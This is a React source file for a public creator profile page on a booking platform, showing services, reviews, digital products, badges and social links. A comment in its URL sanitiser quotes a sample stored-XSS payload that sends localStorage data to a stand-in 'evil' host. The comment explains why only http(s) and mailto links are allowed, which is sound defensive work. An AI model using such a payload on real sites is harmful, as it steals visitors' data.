import { useState, useEffect, useRef } from "react";
import { useParams, useNavigate, Link } from "react-router-dom";
import { getHostProfile, getHostReviews, getHostProducts, getVendorBadges } from "../services/api";
import { analytics, EVENTS } from "../services/analytics";
import BrandPreloader from "../components/preloader/BrandPreloader";
import { useMinimalFooter } from "../context/ChromeContext";
import Seo from "../components/common/Seo";
import { resolveProfileSeo, profileJsonLd, breadcrumbJsonLd, SITE_URL } from "../utils/seo";

// Production base for canonical/OG (Vercel env overrides the apex default).
const SEO_SITE = import.meta.env?.VITE_PUBLIC_SITE_URL || SITE_URL;
import {
  DEFAULT_THEME_COLOR,
  getContrastColor,
  SOCIAL_BRAND_COLORS,
  isValidHex,
  applyProfileTheme,
} from "../utils/themeUtils";

// ─── Design tokens ────────────────────────────────────────────────────────────
const C = {
  bg:        '#F6F6F6',
  card:      '#FFFFFF',
  text:      '#111111',
  secondary: '#666666',
  muted:     '#999999',
  border:    '#E5E5E5',
  btnBg:     '#222222',
  btnText:   '#FFFFFF',
};

// Card metrics (Services/Rating/Reviews stats strip + card star rating) are
// collected and still fetched, but hidden from the landing card. Flip to true
// to re-enable with no layout changes. See spec 2026-06-14-profile-landing-redesign.
const SHOW_CARD_METRICS = false;

// Sanitize a vendor-supplied social link before using it as an href.
// social_links are vendor-controlled and rendered on a public page — a value
// like `javascript:fetch('//evil/?c='+localStorage.user)` would be stored XSS
// against any visitor who clicks it. Allow only http(s) links (and mailto: for
// a valid email); anything else collapses to a harmless '#'.
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const safeUrl = (value, isEmail = false) => {
  const v = String(value || '').trim();
  if (isEmail) return EMAIL_RE.test(v) ? `mailto:${v}` : '#';
  return /^https?:\/\//i.test(v) ? v : '#';
};

// ─── Star Rating ─────────────────────────────────────────────────────────────
const Stars = ({ avg, count, size = "sm" }) => {
  const sz = size === "lg" ? "w-4 h-4" : "w-3 h-3";
  return (
    <div className="flex items-center gap-0.5">
      {[1, 2, 3, 4, 5].map((s) => (
        <svg key={s} className={`${sz} flex-shrink-0`}
          style={{ color: s <= Math.round(avg) ? '#FBBF24' : '#E5E5E5' }}
          fill="currentColor" viewBox="0 0 20 20">
          <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
        </svg>
      ))}
      {avg > 0 && (
        <span className="text-xs ml-1" style={{ color: C.secondary }}>
          {avg.toFixed(1)}{count > 0 ? ` (${count})` : ''}
        </span>
      )}
    </div>
  );
};

// ─── Social Icon SVGs — outline (linear) set, monochrome ──────────────────────
const SOCIAL_ICONS = {
  instagram: <>
    <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
    <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
  </>,
  youtube: <>
    <path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33A2.78 2.78 0 0 0 3.4 19c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.25 29 29 0 0 0-.46-5.33z" />
    <polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02" />
  </>,
  linkedin: <>
    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" />
    <rect x="2" y="9" width="4" height="12" />
    <circle cx="4" cy="4" r="2" />
  </>,
  facebook: <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" />,
  twitter:  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" />,
  whatsapp: <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" />,
  website: <>
    <circle cx="12" cy="12" r="10" />
    <line x1="2" y1="12" x2="22" y2="12" />
    <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
  </>,
  github: <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />,
  email: <>
    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
    <polyline points="22,6 12,13 2,6" />
  </>,
};

const SocialIcon = ({ platform, href }) => {
  const icon = SOCIAL_ICONS[platform];
  if (!icon || !href) return null;
  return (
    <a href={href} target="_blank" rel="noreferrer"
      className="flex items-center justify-center flex-shrink-0 transition-colors hover:bg-gray-50"
      style={{ width: 28, height: 28, borderRadius: 8, border: `1px solid ${C.border}`, color: C.secondary }}
      title={platform.charAt(0).toUpperCase() + platform.slice(1)}>
      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor"
        strokeWidth={1.8} strokeLinecap="round" strokeLinejoin="round"
        viewBox="0 0 24 24">
        {icon}
      </svg>
    </a>
  );
};

// ─── Badge (image award with tooltip) ─────────────────────────────────────────
// Renders a real vendor_badges award: { name, image_url, is_bas_team, ... }.
const Badge = ({ badge }) => {
  const [tip, setTip] = useState(false);
  const label = badge.label || badge.name || 'Badge';
  return (
    <div className="relative">
      <div
        onMouseEnter={() => setTip(true)}
        onMouseLeave={() => setTip(false)}
        className="flex items-center justify-center cursor-default select-none overflow-hidden transition-transform hover:scale-110"
        style={{
          width: 44, height: 44, borderRadius: 2, background: '#F4F4F4', fontSize: 22,
          border: `0.5px solid ${badge.is_bas_team ? C.text : C.border}`,
        }}>
        {badge.image_url
          ? <img src={badge.image_url} alt={label} className="w-full h-full object-contain" />
          : <span className="font-extrabold" style={{ color: C.text }}>{label.charAt(0)?.toUpperCase()}</span>}
      </div>
      {tip && (
        <div className="absolute bottom-full left-1/2 -translate-x-1/2 mb-2 whitespace-nowrap pointer-events-none z-20">
          <div className="text-[11px] font-medium px-2 py-1 rounded-md shadow-sm"
            style={{ background: C.text, color: C.btnText }}>
            {label}
          </div>
        </div>
      )}
    </div>
  );
};

// ─── Service tag derivation ───────────────────────────────────────────────────
const TAG_STYLES = {
  'Best Selling': { bg: '#FFFBEB', color: '#92400E' },
  'Trending':     { bg: '#ECFDF5', color: '#065F46' },
  'New':          { bg: '#EFF6FF', color: '#1D4ED8' },
  'Premium':      { bg: '#F5F3FF', color: '#5B21B6' },
};

const getServiceTag = (service) => {
  if (!service.created_at) return null;
  const days = (Date.now() - new Date(service.created_at).getTime()) / 86400000;
  if (days <= 30) return 'New';
  return null;
};

// ─── Meta columns helper ──────────────────────────────────────────────────────
const MetaRow = ({ price, duration, mode }) => (
  <div className="grid grid-cols-3 gap-2 py-3"
    style={{ borderTop: `1px solid ${C.border}`, borderBottom: `1px solid ${C.border}` }}>
    {[
      { val: price === 0 ? 'Free' : `₹${price}`, lbl: 'Price' },
      { val: `${duration} min`,                   lbl: 'Duration' },
      { val: mode === 'offline' ? 'In-person' : 'Online', lbl: 'Mode' },
    ].map(({ val, lbl }) => (
      <div key={lbl}>
        <div className="text-sm font-semibold" style={{ color: C.text }}>{val}</div>
        <div className="text-[11px] mt-0.5" style={{ color: C.muted }}>{lbl}</div>
      </div>
    ))}
  </div>
);

// ─── Service Card ──────────────────────────────────────────────────────────────
const ServiceCard = ({ service: s, profileSlug, viewMode }) => {
  const _rawDesc  = s.short_description || s.description || '';
  const desc      = _rawDesc.length > 85 ? `${_rawDesc.slice(0, 84)}…` : _rawDesc;
  const detailUrl = s.slug ? `/${profileSlug}/${s.slug}` : null;
  const bookUrl   = s.slug ? `/${profileSlug}/booking/${s.slug}` : null;
  const tag       = getServiceTag(s);
  const tagStyle  = tag ? TAG_STYLES[tag] : null;

  if (viewMode === 'list') {
    return (
      <div className="flex items-end gap-4 bg-white rounded-xl px-5 py-4 transition-shadow hover:shadow-sm"
        style={{ border: `1px solid ${C.border}` }}>
        <div className="flex-1 min-w-0">
          <div className="flex items-baseline gap-2 min-w-0">
            {detailUrl
              ? <Link to={detailUrl} className="font-semibold text-base hover:opacity-60 transition-opacity flex-shrink-0" style={{ color: C.text }}>{s.title}</Link>
              : <span className="font-semibold text-base flex-shrink-0" style={{ color: C.text }}>{s.title}</span>}
            {desc && <span className="flex-shrink-0 self-stretch w-px" style={{ background: C.border }} />}
            {desc && <span className="text-sm truncate min-w-0 flex-1" style={{ color: C.secondary }}>{desc}</span>}
          </div>
          <div className="grid grid-cols-3 gap-3 mt-2">
            {[
              { val: s.price === 0 ? 'Free' : `₹${s.price}`, lbl: 'Price' },
              { val: `${s.duration} min`,                      lbl: 'Duration' },
              { val: s.meeting_mode === 'offline' ? 'In-person' : 'Online', lbl: 'Mode' },
            ].map(({ val, lbl }) => (
              <div key={lbl}>
                <div className="text-sm font-semibold" style={{ color: C.text }}>{val}</div>
                <div className="text-[11px] mt-0.5" style={{ color: C.muted }}>{lbl}</div>
              </div>
            ))}
          </div>
        </div>
        {bookUrl && (
          <Link to={bookUrl}
            className="btn flex-shrink-0 text-sm font-semibold flex items-center transition-opacity hover:opacity-80"
            style={{ background: 'var(--profile-accent, #FE5100)', color: 'var(--profile-accent-text, #ffffff)', height: 40, padding: '0 18px' }}>
            Book Now
          </Link>
        )}
      </div>
    );
  }

  // Grid — fixed 250px height
  return (
    <div className="flex flex-col bg-white rounded-xl transition-shadow hover:shadow-sm"
      style={{ border: `1px solid ${C.border}`, height: 270, padding: '20px 20px 18px' }}>

      {/* Title + tag */}
      <div className="flex items-start justify-between gap-2 mb-2">
        {detailUrl
          ? <Link to={detailUrl} className="font-semibold text-base leading-snug hover:opacity-60 transition-opacity line-clamp-2 flex-1" style={{ color: C.text }}>{s.title}</Link>
          : <span className="font-semibold text-base leading-snug line-clamp-2 flex-1" style={{ color: C.text }}>{s.title}</span>}
        {tagStyle && (
          <span className="flex-shrink-0 text-[10px] font-semibold px-2 py-0.5 rounded-full"
            style={{ background: tagStyle.bg, color: tagStyle.color }}>
            {tag}
          </span>
        )}
      </div>

      {/* Description */}
      <p className="text-sm leading-relaxed line-clamp-2 flex-1 mb-1" style={{ color: C.secondary }}>
        {desc || ' '}
      </p>

      {/* Meta */}
      <MetaRow price={s.price} duration={s.duration} mode={s.meeting_mode} />

      {/* Footer */}
      <div className="flex items-center justify-between mt-3">
        {detailUrl
          ? <Link to={detailUrl} className="text-sm font-medium transition-opacity hover:opacity-60" style={{ color: C.secondary }}>View Details →</Link>
          : <span />}
        {bookUrl && (
          <Link to={bookUrl}
            className="btn text-sm font-semibold flex items-center transition-opacity hover:opacity-80"
            style={{ background: 'var(--profile-accent, #FE5100)', color: 'var(--profile-accent-text, #ffffff)', height: 40, padding: '0 18px' }}>
            Book Now
          </Link>
        )}
      </div>
    </div>
  );
};

// ─── Digital Product Card ─────────────────────────────────────────────────────
const ProductCard = ({ product: p, profileSlug }) => {
  const TYPE_ICONS = { pdf: '📄', template: '🗂️', ebook: '📚', prompt_pack: '✨', resource: '🔗', other: '📦' };
  return (
    <div className="bg-white rounded-xl p-4 flex flex-col transition-shadow hover:shadow-sm"
      style={{ border: `1px solid ${C.border}` }}>
      <div className="flex items-start justify-between gap-2 mb-1">
        <div className="flex items-center gap-1.5 min-w-0">
          <span className="text-base">{TYPE_ICONS[p.type] || '📦'}</span>
          <h3 className="font-semibold text-sm truncate" style={{ color: C.text }}>{p.title}</h3>
        </div>
        <span className="font-bold text-sm flex-shrink-0" style={{ color: C.text }}>
          {p.price === 0 ? 'Free' : `₹${p.price}`}
        </span>
      </div>
      {p.description && (
        <p className="text-xs leading-relaxed line-clamp-2 mb-3" style={{ color: C.secondary }}>{p.description}</p>
      )}
      <div className="flex items-center justify-between mt-auto pt-3" style={{ borderTop: `1px solid ${C.border}` }}>
        <span className="text-[10px]" style={{ color: C.muted }}>{p.purchase_count} purchase{p.purchase_count !== 1 ? 's' : ''}</span>
        <Link to={`/${profileSlug}/product/${p.slug || p.id}`}
          className="btn text-xs font-semibold flex items-center transition-opacity hover:opacity-80"
          style={{ background: 'var(--profile-accent, #FE5100)', color: 'var(--profile-accent-text, #ffffff)', height: 34, padding: '0 14px' }}>
          {p.price === 0 ? 'Get Free' : 'Buy Now'}
        </Link>
      </div>
    </div>
  );
};

// ─── Main ─────────────────────────────────────────────────────────────────────
const HostProfile = () => {
  const { profileSlug } = useParams();
  const navigate = useNavigate();
  const pageRef         = useRef(null);
  const [host,        setHost]        = useState(null);
  const [services,    setServices]    = useState([]);
  const [loading,     setLoading]     = useState(true);
  const [error,       setError]       = useState('');
  // Not-found (and other error) state gets the stripped minimal footer, header kept.
  useMinimalFooter(!!error);
  const [viewMode,    setViewMode]    = useState('grid');
  const [reviewData,  setReviewData]  = useState({ reviews: [], count: 0, avg: 0 });
  const [showReviews, setShowReviews] = useState(false);
  const [products,    setProducts]    = useState([]);
  const [badgeList,   setBadgeList]   = useState([]); // real awards from vendor_badges
  const [cardExpanded, setCardExpanded] = useState(false); // mobile-only collapse
  const [isMobile, setIsMobile] = useState(
    () => typeof window !== 'undefined' && window.matchMedia('(max-width: 639px)').matches
  );
  const [barH,  setBarH]  = useState(0);
  const [bodyH, setBodyH] = useState(0);
  const barRef      = useRef(null);
  const cardBodyRef = useRef(null);

  useEffect(() => {
    const load = async () => {
      try {
        const { data } = await getHostProfile(profileSlug);
        // Old/changed username → server returns the canonical one. The Vercel
        // edge function already issues a real 301 for crawlers; this self-corrects
        // the SPA URL for in-app navigations that bypass the edge.
        if (data.redirect && data.username) {
          navigate(`/${data.username}`, { replace: true });
          return;
        }
        setHost(data.host);
        setServices(data.services || []);
        analytics.track(EVENTS.PROFILE_VIEWED, { host_id: data.host?.id, slug: profileSlug });
        getHostReviews(profileSlug).then(r => setReviewData(r.data)).catch(() => {});
        getHostProducts(profileSlug).then(r => setProducts(r.data || [])).catch(() => {});
        getVendorBadges(profileSlug).then(r => setBadgeList(r.data?.badges || [])).catch(() => {});
      } catch (err) {
        setError(err.response?.status === 404 ? 'Host not found' : 'Something went wrong');
      } finally {
        setLoading(false);
      }
    };
    load();
  }, [profileSlug]);

  // SEO (title/description/robots/canonical/OG/ProfilePage JSON-LD) is rendered
  // declaratively via <Seo> below from the admin-managed fields.

  // Inject --profile-accent and --profile-accent-text CSS variables so all
  // themed elements on this page pick up the host's chosen color.
  useEffect(() => {
    if (!host || !pageRef.current) return;
    const color = isValidHex(host.theme_color) ? host.theme_color : DEFAULT_THEME_COLOR;
    applyProfileTheme(pageRef.current, color);
  }, [host]);

  // Track mobile breakpoint for the collapsible card (curtain only on phones).
  useEffect(() => {
    const mq = window.matchMedia('(max-width: 639px)');
    const onMq = () => setIsMobile(mq.matches);
    mq.addEventListener('change', onMq);
    return () => mq.removeEventListener('change', onMq);
  }, []);

  // Measure collapsed-bar + full-card heights so the max-height curtain is smooth.
  useEffect(() => {
    if (!host) return;
    const measure = () => {
      if (barRef.current)      setBarH(barRef.current.scrollHeight);
      if (cardBodyRef.current) setBodyH(cardBodyRef.current.scrollHeight);
    };
    measure();
    window.addEventListener('resize', measure);
    return () => window.removeEventListener('resize', measure);
  }, [host, products, reviewData]);

  // Derived values are null-safe: the component renders the preloader while
  // host is still loading, so these run before host exists.
  const tc          = host && isValidHex(host.theme_color) ? host.theme_color : DEFAULT_THEME_COLOR;
  const social      = host?.social_links || {};
  const badges      = badgeList;

  const SOCIAL_ORDER = ['instagram', 'youtube', 'linkedin', 'facebook', 'twitter', 'whatsapp', 'website', 'github', 'email'];
  const socialLinks  = SOCIAL_ORDER
    .filter(k => social[k])
    .map(k => ({ key: k, href: safeUrl(social[k], k === 'email') }))
    .filter(({ href }) => href !== '#');

  const stats = [
    { val: services.length,                                               lbl: 'Services' },
    { val: reviewData.avg > 0 ? `${reviewData.avg.toFixed(1)}★` : '—',   lbl: 'Rating'   },
    { val: reviewData.count > 0 ? reviewData.count : '—',                 lbl: 'Reviews'  },
  ];

  // Admin-managed SEO → head tags + ProfilePage JSON-LD (only once host loaded).
  const seo = host ? resolveProfileSeo({ host, siteUrl: SEO_SITE }) : null;
  const jsonLd = host ? [
    profileJsonLd({ host, siteUrl: SEO_SITE, services }),
    breadcrumbJsonLd({ items: [
      { name: 'Home', path: '/' },
      { name: host.name || 'Host', path: `/${host.username}` },
    ], siteUrl: SEO_SITE }),
  ] : null;

  return (
    <>
      {seo && <Seo {...seo} jsonLd={jsonLd} />}
      <BrandPreloader
        variant="profile"
        ready={!loading && !!host && !error}
        profileName={host?.name}
        accentColor={tc}
      />

      {error ? (
        <div className="min-h-[70vh] flex items-center justify-center px-4 py-16" style={{ background: C.bg }}>
          <div className="text-center">
            <p className="text-lg" style={{ color: C.secondary }}>{error}</p>
            <Link to="/" className="mt-4 inline-block text-sm hover:underline" style={{ color: C.text }}>← Back to home</Link>
          </div>
        </div>
      ) : !host ? null : (
    <div ref={pageRef} className="host-profile min-h-screen" style={{ background: C.bg, paddingBottom: 64 }}>

      {host.is_verified === false && (
        <div className="px-4 py-2 text-center text-sm"
          style={{ background: '#FFFBEB', borderBottom: '1px solid #FDE68A', color: '#92400E' }}>
          ⚠️ This creator's account is pending admin verification.
        </div>
      )}

      <div className="app-container pt-8">
        <div className="flex flex-col lg:flex-row gap-6 items-start">

          {/* ── LEFT SIDEBAR — profile card ──────────────────────────────
              <lg: full-width, centered, capped. lg+: fixed 340 sticky left. */}
          <div className="w-full max-w-md mx-auto lg:mx-0 lg:max-w-none lg:w-[340px] lg:flex-shrink-0 lg:sticky lg:top-24">

            {/* Collapsed bar — mobile only; smooth max-height curtain */}
            <div className="sm:hidden overflow-hidden transition-[max-height,opacity] duration-300 ease-out"
              style={{ maxHeight: cardExpanded ? 0 : (barH || 200), opacity: cardExpanded ? 0 : 1 }}>
              <div ref={barRef}>
            <button onClick={() => setCardExpanded(true)}
              className="btn btn--outline w-full flex items-center gap-3 p-3 text-left transition-shadow active:shadow-sm"
              style={{ background: C.card }}>
              <div className="flex-shrink-0 overflow-hidden"
                style={{ width: 48, height: 48, borderRadius: 10, background: C.card }}>
                {host.profile_image
                  ? <img src={host.profile_image} alt={host.name} className="w-full h-full object-cover" />
                  : <div className="w-full h-full flex items-center justify-center text-lg font-bold"
                      style={{ background: `${tc}18`, color: tc }}>
                      {host.name?.charAt(0)?.toUpperCase()}
                    </div>}
              </div>
              <div className="min-w-0 flex-1">
                <div className="font-bold text-sm truncate" style={{ color: C.text }}>{host.name}</div>
                {(host.profession || host.tagline) && (
                  <div className="text-xs truncate" style={{ color: C.secondary }}>{host.profession || host.tagline}</div>
                )}
              </div>
              <svg className="w-5 h-5 flex-shrink-0" style={{ color: C.muted }} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
              </svg>
            </button>
              </div>
            </div>

            {/* Full card — mobile: smooth max-height curtain; sm+: always open */}
            <div className="overflow-hidden transition-[max-height,opacity] duration-300 ease-out sm:!max-h-none sm:!opacity-100"
              style={isMobile ? { maxHeight: cardExpanded ? (bodyH || 2000) : 0, opacity: cardExpanded ? 1 : 0 } : undefined}>
              <div ref={cardBodyRef}>
            <div className="relative overflow-hidden rounded-2xl"
              style={{ background: C.card, border: `2px solid ${C.border}` }}>

              {/* Collapse button — mobile only */}
              <button onClick={() => setCardExpanded(false)} aria-label="Collapse"
                className="sm:hidden absolute top-3 right-3 z-10 flex items-center justify-center w-8 h-8 rounded-full"
                style={{ background: 'rgba(255,255,255,0.85)', color: C.text }}>
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 15l7-7 7 7" />
                </svg>
              </button>

              {/* Cover — 3:1, rounded top only (same ratio as ProfileSetup + ServiceBooking) */}
              <div className="relative overflow-hidden"
                style={{
                  aspectRatio: '3 / 1',
                  borderRadius: '16px 16px 0 0',
                  background: host.cover_image ? undefined : `linear-gradient(135deg, ${tc}33, ${tc}88)`,
                }}>
                {host.cover_image && (
                  <img src={host.cover_image} alt="" className="w-full h-full object-cover" />
                )}
              </div>

              {/* Profile photo — 100×100 square, overlapping cover */}
              <div className="flex justify-center" style={{ marginTop: -42, position: 'relative' }}>
                <div style={{
                  width: 100, height: 100,
                  borderRadius: 12,
                  border: `3px solid ${C.card}`,
                  overflow: 'hidden',
                  background: C.card,
                  flexShrink: 0,
                }}>
                  {host.profile_image
                    ? <img src={host.profile_image} alt={host.name} className="w-full h-full object-cover" />
                    : <div className="w-full h-full flex items-center justify-center text-3xl font-bold"
                        style={{ background: `${tc}18`, color: tc }}>
                        {host.name?.charAt(0)?.toUpperCase()}
                      </div>
                  }
                </div>
                {/* Green online dot — disabled
                {host.google_calendar_connected && (
                  <span style={{
                    position: 'absolute', bottom: 4, right: 'calc(50% - 60px)',
                    width: 14, height: 14, borderRadius: '50%',
                    background: '#22C55E', border: `2px solid ${C.card}`,
                  }} />
                )}
                */}
              </div>

              {/* Profile info + all sections */}
              <div className="px-6 pb-6 pt-4 text-center">

                {/* Name — black (theme colour reserved for the title below) */}
                <h1 className="text-xl font-bold mt-1" style={{ color: C.text }}>{host.name}</h1>

                {/* Profession — in the host's profile accent colour */}
                {(host.profession || host.tagline) && (
                  <p className="text-sm font-medium mt-0.5" style={{ color: tc }}>
                    {host.profession || host.tagline}
                  </p>
                )}


                {/* Available Now — disabled
                {host.google_calendar_connected && (
                  <div className="flex items-center justify-center gap-1.5 mt-1.5">
                    <span style={{ width: 7, height: 7, borderRadius: '50%', background: '#16A34A', display: 'inline-block' }} />
                    <span className="text-xs font-semibold" style={{ color: '#16A34A' }}>Available Now</span>
                  </div>
                )}
                */}

                {/* Card star rating — hidden by default (collect, don't display) */}
                {SHOW_CARD_METRICS && reviewData.avg > 0 && (
                  <div className="flex justify-center mt-2">
                    <Stars avg={reviewData.avg} count={reviewData.count} />
                  </div>
                )}

                {/* Bio — 3 lines max */}
                {host.bio && (
                  <p className="text-sm leading-relaxed mt-3 text-center" style={{ color: C.secondary }}>
                    {host.bio}
                  </p>
                )}

                {/* Badges — single row, no text */}
                {badges.length > 0 && (
                  <div className="flex flex-wrap justify-center gap-2 mt-5">
                    {badges.map((b, i) => <Badge key={i} badge={b} />)}
                  </div>
                )}

                {/* Social links — 36×36 circles with brand colors */}
                {socialLinks.length > 0 && (
                  <div className="flex flex-wrap justify-center gap-2 mt-5">
                    {socialLinks.map(({ key, href }) => (
                      <SocialIcon key={key} platform={key} href={href} />
                    ))}
                  </div>
                )}

                {/* Stats — hidden by default (collect, don't display) */}
                {SHOW_CARD_METRICS && (
                  <div className="grid grid-cols-3 mt-6 pt-5"
                    style={{ borderTop: `1px solid ${C.border}` }}>
                    {stats.map(({ val, lbl }, i) => (
                      <div key={lbl}
                        className={i > 0 ? 'border-l' : ''}
                        style={{ borderColor: C.border }}>
                        <div className="text-lg font-bold" style={{ color: C.text }}>{val}</div>
                        <div className="text-[11px] mt-0.5" style={{ color: C.muted }}>{lbl}</div>
                      </div>
                    ))}
                  </div>
                )}

                {/* Location */}
                {host.location && (
                  <div className="flex items-center justify-center gap-1 mt-4 text-xs" style={{ color: C.muted }}>
                    <svg className="w-3 h-3 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                        d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                        d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                    </svg>
                    {host.location}
                  </div>
                )}
              </div>
            </div>
              </div>
            </div>
          </div>

          {/* ── RIGHT — services, reviews, products ──────────────────────── */}
          <div className="w-full lg:flex-1 min-w-0">

            {/* Header row */}
            <div className="flex items-center justify-between mb-5">
              <h2 className="text-lg font-bold" style={{ color: C.text }}>Services</h2>

              {/* Grid / List toggle — hidden on mobile (no real value) */}
              <div className="hidden sm:flex rounded-lg overflow-hidden" style={{ border: `1px solid ${C.border}`, background: C.card }}>
                {[
                  {
                    mode: 'grid',
                    icon: <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 16 16">
                      <path d="M1 2.5A1.5 1.5 0 012.5 1h3A1.5 1.5 0 017 2.5v3A1.5 1.5 0 015.5 7h-3A1.5 1.5 0 011 5.5v-3zm8 0A1.5 1.5 0 0110.5 1h3A1.5 1.5 0 0115 2.5v3A1.5 1.5 0 0113.5 7h-3A1.5 1.5 0 019 5.5v-3zm-8 8A1.5 1.5 0 012.5 9h3A1.5 1.5 0 017 10.5v3A1.5 1.5 0 015.5 15h-3A1.5 1.5 0 011 13.5v-3zm8 0A1.5 1.5 0 0110.5 9h3a1.5 1.5 0 011.5 1.5v3a1.5 1.5 0 01-1.5 1.5h-3A1.5 1.5 0 019 13.5v-3z" />
                    </svg>,
                  },
                  {
                    mode: 'list',
                    icon: <svg className="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 16 16">
                      <path fillRule="evenodd" d="M2.5 12a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5zm0-4a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5zm0-4a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5z" />
                    </svg>,
                  },
                ].map(({ mode, icon }) => (
                  <button key={mode} onClick={() => setViewMode(mode)}
                    aria-label={`${mode} view`} title={`${mode} view`}
                    className="flex items-center justify-center px-3 py-2 transition-colors"
                    style={viewMode === mode
                      ? { background: C.text, color: C.btnText }
                      : { color: C.secondary }}>
                    {icon}
                  </button>
                ))}
              </div>
            </div>

            {/* Service cards */}
            {services.length === 0 ? (
              <div className="rounded-xl py-16 text-center"
                style={{ background: C.card, border: `1px solid ${C.border}` }}>
                <p style={{ color: C.muted }}>No services available yet.</p>
              </div>
            ) : (
              <div className={viewMode === 'grid'
                ? 'grid grid-cols-1 md:grid-cols-2 gap-6'
                : 'space-y-3'}>
                {services.map(s => (
                  <ServiceCard key={s.id} service={s} profileSlug={profileSlug} viewMode={viewMode} />
                ))}
              </div>
            )}

            {/* Reviews */}
            {reviewData.count > 0 && (
              <div className="mt-10">
                <button onClick={() => setShowReviews(v => !v)}
                  className="flex items-center gap-3 mb-4">
                  <h2 className="text-lg font-bold" style={{ color: C.text }}>Reviews</h2>
                  <Stars avg={reviewData.avg} count={reviewData.count} size="lg" />
                  <svg className={`w-4 h-4 transition-transform ${showReviews ? 'rotate-180' : ''}`}
                    style={{ color: C.muted }} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                  </svg>
                </button>
                {showReviews && (
                  <div className="space-y-3">
                    {reviewData.reviews.map(r => (
                      <div key={r.id} className="rounded-xl p-4"
                        style={{ background: C.card, border: `1px solid ${C.border}` }}>
                        <div className="flex items-start gap-3">
                          <div className="w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold flex-shrink-0"
                            style={{ background: C.text, color: C.btnText }}>
                            {r.profiles?.name?.charAt(0) || '?'}
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <span className="text-sm font-medium" style={{ color: C.text }}>{r.profiles?.name || 'Anonymous'}</span>
                              <Stars avg={r.rating} count={0} />
                            </div>
                            {r.comment && <p className="text-sm leading-relaxed" style={{ color: C.secondary }}>{r.comment}</p>}
                            <p className="text-xs mt-1" style={{ color: C.muted }}>
                              {new Date(r.created_at).toLocaleDateString('en-IN', { month: 'short', day: 'numeric', year: 'numeric' })}
                            </p>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}

            {/* Digital Products */}
            {products.length > 0 && (
              <div className="mt-10">
                <h2 className="text-lg font-bold mb-4" style={{ color: C.text }}>Digital Products</h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {products.map(p => (
                    <ProductCard key={p.id} product={p} profileSlug={profileSlug} />
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
